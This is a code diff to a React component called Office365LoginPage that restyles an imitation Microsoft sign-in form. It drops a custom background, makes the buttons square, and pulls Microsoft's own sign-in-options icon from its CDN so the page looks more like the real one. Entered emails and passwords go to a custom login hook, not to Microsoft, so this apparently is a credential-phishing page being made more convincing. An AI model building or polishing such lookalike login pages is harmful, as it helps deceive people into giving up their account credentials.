@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
-import { ArrowLeft, Search } from 'lucide-react';
+import { ArrowLeft } from 'lucide-react';
 
 interface Office365LoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
@@ -31,13 +31,10 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
   };
 
   return (
-    <div 
-      className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
-      style={{ backgroundImage: "url('https://i.imgur.com/L9t9YxT.jpeg')" }}
-    >
-      <div className="w-full max-w-[440px]">
-        {/* Frosted Glass Card Effect */}
-        <div className="bg-white/70 backdrop-blur-xl shadow-2xl rounded-lg p-11">
+    <div className="min-h-screen flex items-center justify-center p-4 font-sans bg-gray-100">
+      <div className="w-full max-w-[440px] shadow-lg">
+        {/* Solid White Card */}
+        <div className="bg-white p-11">
           {!showPasswordStep ? (
             // Email View
             <div>
@@ -58,7 +55,7 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
                 <p className="text-sm mt-4">No account? <a href="https://signup.live.com/" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Create one!</a></p>
                 <p className="text-sm mt-2"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Can't access your account?</a></p>
                 <div className="text-right mt-6">
-                  <button onClick={handleNext} disabled={!email} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:bg-[#005a9e] disabled:bg-gray-400">
+                  <button onClick={handleNext} disabled={!email} className="px-8 py-2 bg-[#0067b8] text-white font-medium hover:bg-[#005a9e] disabled:bg-gray-400">
                     Next
                   </button>
                 </div>
@@ -86,7 +83,7 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
                 />
                 <p className="text-sm mt-4"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Forgot password?</a></p>
                  <div className="text-right mt-6">
-                  <button type="submit" disabled={isLoading || !password} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:bg-[#005a9e] disabled:bg-gray-400 flex items-center justify-center min-w-[108px]">
+                  <button type="submit" disabled={isLoading || !password} className="px-8 py-2 bg-[#0067b8] text-white font-medium hover:bg-[#005a9e] disabled:bg-gray-400 flex items-center justify-center min-w-[108px]">
                     {isLoading ? <Spinner size="sm" color="border-white" /> : 'Sign in'}
                   </button>
                 </div>
@@ -94,10 +91,11 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
             </div>
           )}
         </div>
-        <div className="bg-white/70 backdrop-blur-xl shadow-2xl rounded-lg p-4 mt-4 cursor-pointer">
-          <div className="flex items-center text-gray-700">
-            <Search className="w-5 h-5 text-gray-600 mr-3" />
-            <span className="text-[15px]">Sign-in options</span>
+        {/* Sign-in Options Card */}
+        <div className="bg-white border-t border-gray-200 p-4 cursor-pointer hover:bg-gray-50">
+          <div className="flex items-center ml-7">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options" className="w-6 h-6 mr-3" />
+            <span className="text-gray-700 text-[15px]">Sign-in options</span>
           </div>
         </div>
       </div>
